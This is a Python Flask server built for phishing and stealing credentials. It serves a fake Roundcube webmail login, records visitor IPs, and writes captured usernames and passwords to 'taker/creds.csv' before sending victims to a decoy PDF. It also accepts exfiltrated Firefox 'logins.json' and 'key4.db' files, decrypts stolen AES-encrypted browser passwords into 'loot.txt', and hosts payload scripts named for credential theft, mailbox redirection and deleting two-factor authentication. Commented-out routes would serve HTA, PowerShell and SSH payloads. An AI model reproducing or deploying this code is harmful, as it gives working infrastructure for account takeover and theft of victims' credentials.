from flask import Flask, send_from_directory, request, redirect, url_for, jsonify
import datetime
import base64
import os
from flask import Blueprint, render_template, request
from Cryptodome.Cipher import AES
import uuid
import logging
from flask_cors import CORS








app = Flask(__name__)
web = Blueprint('web', __name__)



logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)



###########from fastapi old payload###################################





# Define the origins that should be allowed to make requests to your API
CORS(app, resources={r"/*": {"origins": "*"}})

@app.route("/zJ2w9x", methods=["GET"])
def save_url():
#    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
    
#    if dick != 'bigdick':
#        return jsonify({"error": "Invalid"}), 403
    #######################    
    url = str(request.url)

    # Define the file path where you want to save the URL
    file_path = "url.txt"

    # Write the URL to the file
    with open(file_path, "a") as file:
        file.write(url + "\n")

    return '', 200

@app.route("/zJ2w9x/uploadfile/", methods=["POST"])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    if file:
        file_location = os.path.join("files", file.filename)
        file.save(file_location)
        return jsonify({"info": f"file '{file.filename}' saved at '{file_location}'"}), 200

    return jsonify({"error": "File upload failed"}), 500










@web.route('/',methods = ['POST'])
def append():

        # recieve
        url = request.form['url']
        username = request.form['username']
        encryptedPassword = request.form['password']
        key = request.form['key']

        # decode and prepare key and cipher
        key = base64.b64decode(key)
        iv = base64.b64decode(encryptedPassword)[3:15]
        encryptedPassword = base64.b64decode(encryptedPassword)[15:-16]

        #construct AES object and decrypt
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decryptedPassword = cipher.decrypt(encryptedPassword)

        # write result to loot 
        f = open("loot.txt","a")
        f.write(f"{url},,,, {username},,,, {decryptedPassword}\n")
        f.close()

        return decryptedPassword, 200


app.register_blueprint(web, url_prefix='/')


##########---SAVE CREDS FIREFOX ON folders---#########
uploads_dir = 'uploads'
os.makedirs(uploads_dir, exist_ok=True)

# Counter to keep track of the number of pairs uploaded
pair_counter = 0





###########---reCAPTCHA/Chrome---##############
# @app.route('/document')
# def first():
    
#     return send_from_directory('static', 'index.html')

# @app.route('/B')
# def serve_hta():
#     return send_from_directory('static', 'Browser.ps1')

# @app.route('/b')
# def serves():
#     return send_from_directory('static', 'browser.hta')

# @app.route('/id_rsa')
# def very():
#     return send_from_directory('static', 'id_rsa')


######################SSH##########################

# @app.route('/ssh')
# def exe():
#     return send_from_directory('OpenSSH-Win64', 'ssh.exe')


# @app.route('/libcrypto')
# def dll():
#     return send_from_directory('OpenSSH-Win64', 'libcrypto.dll')


# @app.route('/endpoint', methods=['POST'])
# def receive_message():
#     data = request.get_json()
#     message = data.get('message')
#     print(f"Received message: {message}")
#     return jsonify({"status": "success"}), 200




################----SCRIPTS-----#####################
@app.route('/addRedirectMailBox.js')
def addRedirectMailBox():
#    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
    
#    if dick != 'bigdick':
#        return jsonify({"error": "Invalid"}), 403
    return send_from_directory('.', 'addRedirectMailBox.js')



@app.route('/getUserCredentials.js')
def getUserCredentials():
#    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
    
#    if dick != 'bigdick':
 #       return jsonify({"error": "Invalid"}), 403    
    return send_from_directory('.', 'getUserCredentials.js')


@app.route('/getUserCredentialsOLD.js')
def getUserCredentialsOLD():
#    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
    
#    if dick != 'bigdick':
 #       return jsonify({"error": "Invalid"}), 403    
    return send_from_directory('.', 'getUserCredentialsOLD.js')












@app.route('/delTwoAuth.js')
def delTwoAuth():
#    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
#    
#    if dick != 'bigdick':
#        return jsonify({"error": "Invalid"}), 403    
    return send_from_directory('.', 'delTwoAuth.js')










################---Save FireFox---######################
@app.route('/upload', methods=['POST'])
def uploads_file():

    global pair_counter

    data = request.get_json()
    filename = data.get('filename')
    file_content = data.get('file')

    if filename and file_content:
        try:
            # Decode the Base64 string
            file_bytes = base64.b64decode(file_content)

            # Determine the folder name based on the pair counter
            folder_number = pair_counter // 2 + 1
            folder_name = f'folder_{folder_number}'
            folder_path = os.path.join(uploads_dir, folder_name)

            # Create the folder if it doesn't exist
            if not os.path.exists(folder_path):
                os.makedirs(folder_path)

            # Save the file in the determined folder
            file_path = os.path.join(folder_path, filename)
            with open(file_path, 'wb') as f:
                f.write(file_bytes)

            # Increment the pair counter if the file is part of a new pair
            if filename in ['logins.json', 'key4.db']:
                pair_counter += 1

            logger.info(f"File {filename} uploaded successfully to {folder_name}")
            return jsonify({"message": f"File {filename} uploaded successfully to {folder_name}"}), 200
        except Exception as e:
            logger.error(f"An error occurred: {str(e)}")
            return jsonify({"message": f"An error occurred: {str(e)}"}), 500
    else:
        logger.error("No file content found")
        return jsonify({"message": "No file content found"}), 400



@app.route('/')
def index():
    log_visit()
   # return send_from_directory('.', 'logon.html')
    return send_from_directory('.', 'roundcube.html')




def log_visit():
    remote_addr = request.headers.get('X-Real-IP', request.remote_addr)
    remote_agent = request.headers.get('User-Agent')
    current_date = datetime.datetime.now().strftime('%d-%m-%y %H:%M:%S')

    with open('taker/visit.csv', 'a') as file:
        file.write(f"Addr: {remote_addr}\n")
        file.write(f"Agent: {remote_agent}\n")
        file.write(f"Date: {current_date}\n")
        file.write("<==============================================================================>\n")

    return '', 204  # No content response

@app.route('/authentification.php', methods=['POST'])
def handle_authentification():
    username = request.form.get('_user')
    password = request.form.get('_pass')#

    if username and password:
        print(username,password,'=================================================')
        if not is_credential_exists(username, password):
            with open('taker/creds.csv', 'a') as file:
                file.write(f"Username: {username}\n")
                file.write(f"Password: {password}\n")
                file.write("<==============================================================================>\n")

    # Redirect to the specified URL after handling the POST request
    return redirect('https://zhblz.com/Adob_Scan_15_ian._2025.pdf')

def is_credential_exists(username, password):
    try:
        with open('taker/creds.csv', 'r') as file:
            lines = file.readlines()
            i = 0
            while i < len(lines):
                if lines[i].startswith("Username: ") and lines[i].strip() == f"Username: {username}":
                    if i + 1 < len(lines) and lines[i + 1].startswith("Password: ") and lines[i + 1].strip() == f"Password: {password}":
                        return True
                i += 1
    except FileNotFoundError:
        pass  # File does not exist, so no credentials are saved yet
    return False

@app.route('/<path:filename>')
def serve_static(filename):
#    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
#    
#    if dick != 'bigdick':
#        return jsonify({"error": "Invalid"}), 403    
    return send_from_directory('.', filename)




# Run old payload by one Request

@app.route('/worker')
def serve_worker():
    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
 #   
#    if dick != 'bigdick':
#        return jsonify({"error": "Invalid"}), 403
    return send_from_directory('.', 'worker.js')
#def get_worker():
#    with open('worker.js', 'r') as f:
#        return f.read(), 200, {'Content-Type': 'application/javascript'}








@app.route('/worker2')
def serve_worker2():
    dick = request.headers.get('secure')
#    if not dick:
#        return jsonify({"error": "Invalid"}), 400
 #   
#    if dick != 'bigdick':
#        return jsonify({"error": "Invalid"}), 403
    return send_from_directory('.', 'worker2.js')
#def get_worker():
#    with open('worker.js', 'r') as f:
# 


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

